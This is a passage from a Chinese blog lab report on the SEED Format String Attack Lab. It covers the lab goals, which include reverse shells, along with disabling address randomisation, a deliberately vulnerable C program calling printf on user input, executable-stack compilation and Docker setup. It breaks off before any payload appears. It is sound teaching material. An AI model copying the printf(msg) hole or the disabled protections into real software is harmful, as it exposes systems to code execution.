

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Wu Yuhan">
  <meta name="keywords" content="">
  
    <meta name="description" content="软件安全课程实验 Format String Attack（SeedUbuntu20.04版本）">
<meta property="og:type" content="article">
<meta property="og:title" content="Format String Attack Lab">
<meta property="og:url" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/index.html">
<meta property="og:site_name" content="Yuhan&#39;s blog">
<meta property="og:description" content="软件安全课程实验 Format String Attack（SeedUbuntu20.04版本）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101734182.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101933264.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102043165.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102121805.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102145074.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201124911369.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150434142.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150450719.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150559167.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151707668.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150258693.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150214883.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150352151.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150332057.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151730211.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201151845038.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154021212.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201154405920.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201155539801.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162008447.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201162034070.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161817247.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201161838430.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171027112.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171129393.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171214123.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201171233679.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201194243554.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202095518910.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105511104.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102003621.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202102052424.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202105907665.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110353971.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110559075.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202110819562.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211202111143735.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203173126917.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200540036.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211203200601940.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104442584.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204104428944.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204105936022.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204110238866.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111437052.png">
<meta property="og:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204111744294.png">
<meta property="article:published_time" content="2021-12-03T16:00:00.000Z">
<meta property="article:modified_time" content="2024-01-19T16:44:36.156Z">
<meta property="article:author" content="Wu Yuhan">
<meta property="article:tag" content="软件安全实验">
<meta property="article:tag" content="计算机安全导论">
<meta property="article:tag" content="SeedUbuntu">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://yuhan2001.github.io/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101734182.png">
  
  
  <title>Format String Attack Lab - Yuhan&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://lib.baomitu.com/highlight.js/10.7.3/styles/vs2015.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yuhan2001.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"6da93a2e5d7f160e0f40b273ddbbddac","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Yuhan&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/3.jpeg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Format String Attack Lab">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-12-04 00:00" pubdate>
        2021年12月4日 凌晨
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      23k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      195 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Format String Attack Lab</h1>
            
            <div class="markdown-body">
              <h1><a target="_blank" rel="noopener" href="https://seedsecuritylabs.org/Labs_20.04/Software/Format_String/">Format String Attack</a></h1>
<h2 id="1-概述">1 概述</h2>
<p>​		C语言中的<code>printf()</code>函数用于根据格式打印出字符串。它的第一个参数称为格式字符串，它定义了字符串的格式。 格式字符串使用由 % 字符标记的占位符用于<code>printf()</code> 函数在打印期间填充数据。 格式字符串的使用不仅限于<code>printf()</code> 函数； 许多其他函数，例如 <code>sprintf()</code>、<code>fprintf()</code> 和 <code>scanf()</code>，也使用格式字符串。 某些程序允许用户以格式字符串提供全部或部分内容。 如果这些内容没有被清理干净，恶意用户就可以利用这个机会让程序运行任意代码。 这样的问题称为格式字符串漏洞。</p>
<p>​		本实验的目的是通过将从课堂上学到的关于漏洞的知识付诸行动，获得有关格式字符串漏洞的第一手经验。 我们将获得一个带有格式字符串漏洞的程序，任务是利用该漏洞实现以下破坏：（1）程序崩溃，（2）读取程序内存，（3）修改程序内存，最严重的是，（4）注入并使用受害者程序的特权执行恶意代码。 本实验涵盖以下主题：</p>
<ul>
<li>格式化字符串漏洞和代码注入</li>
<li>堆栈布局</li>
<li>Shellcode</li>
<li>反向shell</li>
</ul>
<h3 id="实验环境">实验环境</h3>
<ul>
<li>SEED Ubuntu 20.04 VM</li>
</ul>
<h2 id="2-环境配置">2 环境配置</h2>
<h3 id="2-1-改变对策">2.1 改变对策</h3>
<p>​		现代操作系统使用地址空间随机化来随机化堆和栈的起始地址。 这使得猜测确切地址变得困难； 猜测地址是格式字符串攻击的关键步骤之一。 为了简化本实验中的任务，我们使用以下命令关闭地址随机化：</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作">实验操作</h4>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101734182.png" srcset="/img/loading.gif" lazyload alt="image-20211204101734182"></p>
<h3 id="2-2-易受攻击的程序">2.2 易受攻击的程序</h3>
<p>​		本实验中使用的易受攻击的程序名为<code>format.c</code>，可以在server-code文件夹中找到。 这个程序有一个格式字符串漏洞，你的工作就是利用这个漏洞。 下面列出的代码删除了非必要信息，因此它与从实验设置文件中获得的不同。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> target = <span class="hljs-number">0x11223344</span>;<br><span class="hljs-type">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">myprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>	<span class="hljs-comment">// This line has a format-string vulnerability</span><br>	<span class="hljs-built_in">printf</span>(msg);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>	<span class="hljs-type">char</span> buf[<span class="hljs-number">1500</span>];<br>	<span class="hljs-type">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input size: %d\n&quot;</span>, length);	<br>	myprintf(buf);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<ul>
<li>上述程序从标准输入中读取数据，然后将数据传递给<code>myprintf()</code>，后者调用<code>printf()</code>将数据打印出来。 将输入数据馈送到<code>printf()</code>函数的方式是不安全的，并且会导致格式字符串漏洞。 我们将利用这个漏洞。</li>
<li>该程序将在具有 root 权限的服务器上运行，其标准输入将被重定向到服务器和远程用户之间的 TCP 连接。 因此，该程序实际上是从远程用户那里获取数据的。 如果用户可以利用此漏洞，则可能会造成损害。</li>
</ul>
<h4 id="编译">编译</h4>
<p>​		我们将把格式化程序编译成 32 位和 64 位二进制文件。 我们预先构建的 Ubuntu 20.04 VM 是 64 位 VM，但它仍然支持 32 位二进制文件。 我们需要做的就是在<code>gcc</code>命令中使用<code>-m32</code>选项。对于 32 位编译，我们还使用<code>-static</code>生成静态链接的二进制文件，它是自包含的，不依赖于任何动态库，因为 32 位动态库未安装在我们的容器中。</p>
<p>​		<code>Makefile</code>中已经提供了编译命令。 要编译代码，需要键入<code>make</code>来执行这些命令。 编译完成后，我们需要将二进制文件复制到<code>fmt-containers</code>文件夹中，以便容器可以使用它们。 以下命令进行编译安装。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make install</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>在编译过程中，将看到一条警告消息。 此警告是由<code>gcc</code>编译器针对格式字符串漏洞实施的对策生成的。我们现在可以忽略这个警告。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">format.c: In function ’myprintf’: <br>format.c:33:5: warning: format not a string literal and no format arguments [-Wformat-security] <br>33 | printf(msg); <br>   | ˆ˜˜˜˜˜<br></code></pre></div></td></tr></table></figure>
<ul>
<li>需要注意的是，该程序需要使用<code>-z execstack</code>选项进行编译，该选项允许堆栈可执行。 我们的最终目标是将代码注入服务器程序的堆栈中，然后触发代码。 不可执行堆栈是针对基于堆栈的代码注入攻击的对策，但可以使用返回到<code>libc</code>技术来击败它，另一个SEED实验对此进行了介绍。 在本实验中，为简单起见，我们禁用了这种可击败的对策。</li>
</ul>
<h4 id="关于Server-Program">关于Server Program</h4>
<p>​		在 server-code 文件夹中，可以找到一个名为<code>server.c</code>的程序。这是服务器的主要入口点。它监听9090端口，当它接收到一个TCP连接时，它调用格式化程序，并将TCP连接设置为格式化程序的标准输入。这样，<code>format</code>从<code>stdin</code>读取数据时，实际上是从TCP连接中读取的，即数据是由用户在TCP客户端提供的。学生无需阅读<code>server.c</code>的源代码。</p>
<p>​		服务器程序中添加了一点随机性，因此不同的学生可能会看到内存地址和帧指针的不同值。 这些值只有在容器重新启动时才会改变，所以只要保持容器运行，就会看到相同的数字（不同学生看到的数字仍然不同）。 这种随机性不同于地址随机化对策。它的唯一目的是让学生的工作有所不同。</p>
<h4 id="实验操作-2">实验操作</h4>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101933264.png" srcset="/img/loading.gif" lazyload alt="image-20211204101933264"></p>
<h3 id="2-3-容器设置">2.3 容器设置</h3>
<p>​		进入 <code>Labsetup</code>文件夹，使用<code>docker-compose.yml</code>文件设置实验室环境。</p>
<ul>
<li>下面，我们列出一些与 Docker 和 Compose 相关的常用命令。 由于我们将非常频繁地使用这些命令，因此我们在<code>.bashrc</code>文件（在我们提供的 SEEDUbuntu 20.04 VM 中）中为它们创建了别名。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose build <span class="hljs-comment"># Build the container image</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose up <span class="hljs-comment"># Start the container</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose down <span class="hljs-comment"># Shut down the container</span></span><br><br>// Aliases for the Compose commands above<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcup <span class="hljs-comment"># Alias for: docker-compose up</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcdown <span class="hljs-comment"># Alias for: docker-compose down</span></span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>所有容器都将在后台运行。 要在容器上运行命令，我们通常需要在该容器上获得一个 shell。 我们首先需要使用<code>docker ps</code>命令找出容器的ID，然后使用<code>docker exec</code>在该容器上启动一个shell。 在<code>.bashrc</code>文件中为它们创建了别名。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash</span><br>// The following example shows how to get a shell inside hostC<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dockps</span><br>b1004832e275 hostA-10.9.0.5<br>0af4ea7a3e2e hostB-10.9.0.6<br>9652715c8e0a hostC-10.9.0.7<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docksh 96</span><br>root@9652715c8e0a:/#<br>// Note: If a docker command requires a container ID, you do not need to<br>// type the entire ID string. Typing the first few characters will<br>// be sufficient, as long as they are unique among all the containers.<br></code></pre></div></td></tr></table></figure>
<h4 id="实验操作-3">实验操作</h4>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102043165.png" srcset="/img/loading.gif" lazyload alt="image-20211204102043165"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102121805.png" srcset="/img/loading.gif" lazyload alt="image-20211204102121805"></p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102145074.png" srcset="/img/loading.gif" lazyload alt="image-20211204102145074"></p>
<ul>
<li>
<p>容器<code>fmt-server-1</code>(server-10.9.0.5)，<code>fmt-server-2</code>(server-10.9.0.6)创建完成。</p>
</li>
<li>
<p>接下来在容器server-10.9.0.5上获得shell：</p>
<p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201124911369.png" srcset="/img/loading.gif" lazyload alt="image-20211201124911369"></p>
</li>
</ul>
<h2 id="3-任务1：使程序崩溃">3 任务1：使程序崩溃</h2>
<p>当我们使用包含的<code>docker-compose.yml</code>文件启动容器时，将启动两个容器，每个容器运行一个易受攻击的服务器。 对于此任务，我们将使用运行在 10.9.0.5 上的服务器，该服务器运行具有格式字符串漏洞的 32 位程序。 让我们首先向该服务器发送一条良性消息。 我们将看到目标容器打印出以下消息（看到的实际消息可能会有所不同）。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> hello | nc 10.9.0.5 9090</span><br>Press Ctrl+C<br>// Printouts on the container’s console<br>server-10.9.0.5 | Got a connection from 10.9.0.1<br>server-10.9.0.5 | Starting format<br>server-10.9.0.5 | Input buffer (address): 0xffffd2d0<br>server-10.9.0.5 | The secret message’s address: 0x080b4008<br>server-10.9.0.5 | The target variable’s address: 0x080e5068<br>server-10.9.0.5 | Input size: 6<br>server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8<br>server-10.9.0.5 | The target variable’s value (before): 0x11223344<br>server-10.9.0.5 | hello<br>server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)<br>server-10.9.0.5 | The target variable’s value (after): 0x11223344<br></code></pre></div></td></tr></table></figure>
<p>服务器将接受您提供的最多 1500 字节的数据。 在本实验中的主要工作是构建不同的payloads来利用服务器中的格式字符串漏洞，从而实现每个任务中指定的目标。 如果将payloads保存在文件中，则可以使用以下命令将有效负载发送到服务器。</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> &lt;file&gt; | nc 10.9.0.5 9090</span> <br>Press Ctrl+C if it does not exit.<br></code></pre></div></td></tr></table></figure>
<h3 id="具体任务">具体任务</h3>
<p>​		向服务器提供一个输入，这样当服务器程序试图在<code>myprintf()</code>函数中打印出用户输入时，它会崩溃。 您可以通过查看容器的打印输出来判断格式化程序是否崩溃。如果<code>myprintf()</code>返回，它将打印出“Returned properly”和几个笑脸。 如果没有看到它们，则格式化程序可能已崩溃。</p>
<p>​		但是，服务器程序不会崩溃；崩溃的格式化程序在服务器程序产生的子进程中运行。</p>
<p>​		由于本实验中构建的大多数格式化字符串可能很长，因此最好使用程序来执行此操作。 在attack-code目录中，一个名为build string.py的示例代码展示了如何将各种类型的数据放入一个字符串中。</p>
<h3 id="实验操作-4">实验操作</h3>
<ol>
<li>
